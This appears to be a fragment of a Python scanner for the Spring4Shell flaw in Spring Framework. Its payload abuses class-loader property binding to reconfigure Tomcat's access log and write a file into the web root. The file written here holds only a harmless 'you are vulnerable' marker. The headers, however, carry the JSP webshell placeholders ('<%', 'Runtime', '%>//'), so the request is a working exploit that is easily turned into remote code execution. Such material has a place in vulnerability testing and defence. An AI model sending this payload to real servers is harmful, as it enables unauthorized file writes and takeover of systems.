REGEX = r"(https?://\S*?)/(\S*)"
HEADERS = {
        "suffix":"%>//",
        "c1":"Runtime",
        "c2":"<%",
        "DNT":"1",
        "Content-Type":"application/x-www-form-urlencoded"
    }
DATA = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3CVuln%20%3E%0AOh%20no!%20You%20are%20vulnerable%0A%3C/Vuln%3E&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=sniffer&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
